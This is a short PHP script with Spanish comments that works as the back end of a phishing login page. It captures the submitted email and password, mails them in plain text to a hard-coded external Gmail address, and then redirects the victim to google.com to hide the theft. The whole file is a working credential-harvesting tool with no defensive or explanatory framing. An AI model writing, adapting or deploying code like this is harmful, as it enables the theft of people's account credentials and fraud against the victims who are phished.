<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $to = 'guillenob8203@gmail.com'; // Dirección de destino
    $subject = 'Nuevo intento de login';
    $message = "Correo: $email\nContraseña: $password";
    $headers = "From: no-reply@tusitio.com\r\n";

    if (mail($to, $subject, $message, $headers)) {
        // Redirección después de enviar el correo
        header("Location: https://www.google.com");
        exit(); // Asegura que no se ejecuten más instrucciones después de la redirección
    } else {
        echo "Error al enviar los datos.";
    }
} else {
    echo "Acceso no permitido.";
}
?>